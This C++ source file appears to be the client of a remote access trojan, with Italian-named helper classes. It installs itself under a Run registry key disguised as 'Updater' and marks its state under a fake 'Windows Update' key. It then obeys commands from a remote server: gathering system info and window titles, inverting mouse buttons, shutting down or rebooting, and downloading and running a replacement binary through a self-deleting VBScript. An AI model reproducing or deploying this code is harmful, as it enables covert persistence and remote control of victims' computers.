#pragma once

bool IsInstalled()
{
	RegUtils ru;

	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
}

void InstallClient()
{
	Settaggi sett;
	RegUtils ru;
	SystemUtils su;
	DirUtils du;

	sett.InstallSettings();

	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;

	if (PathToCopy.find("<User>") != string::npos)
		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());

	if (sett.RegStartup)
		ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, PathToCopy.c_str());

	du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy);
	
	su.RunExe(PathToCopy);

	ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true");
}

bool GetInfo(SOCKET Sock)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;

	json j;

    j["IPL"] = TcpIP::GetLocalIP(Sock);
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = "TODO";

	return COMUNICAZIONI::GetInfo(Sock, j.dump());
}

bool InvertMouse(SOCKET Sock)
{
	MouseUtils mu;

	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
}

bool UpdateClient(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;

	string NewClient = COMUNICAZIONI::UpdateClient(Sock);

	if (NewClient == "")
		return false;

	du.SetCurrDir(du.GetModuleFilePath());
	if (!du.CheckDir("VXBkYXRl"))
		du.MakeDir("VXBkYXRl");

	if (!du.WriteBinaryFile("VXBkYXRl\\" + du.GetModuleFile(), NewClient))
		return false;

	if (!du.WriteFile("Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFile() + "\"\nfilesys.MoveFile \"VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetModuleFile() + "\"\nWshShell.Run \"" + du.GetModuleFile() + "\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
		return false;

	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

	return true;
}

short Sessione(TcpIP Client)
{
	SystemUtils su;
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			i = false;
		else if (cmd == "getinfo")
		{
			i = GetInfo(Client.Sock);
		}
		else if (cmd == "invertmouse")
		{
			i = InvertMouse(Client.Sock);
		}
		else if (cmd == "reconnect")
			i = false;
		else if (cmd == "kill")
			return 1;
		else if (cmd == "shutdown")
		{
			su.NoOutputCMD("shutdown -s -t 0");
			return 1;
		}
		else if (cmd == "reboot")
		{
			su.NoOutputCMD("shutdown -r -t 0");
			return 1;
		}
		else if (cmd == "updateclient")
		{
			if (UpdateClient(Client.Sock))
				return 1;
		}
	}

	return 0;
}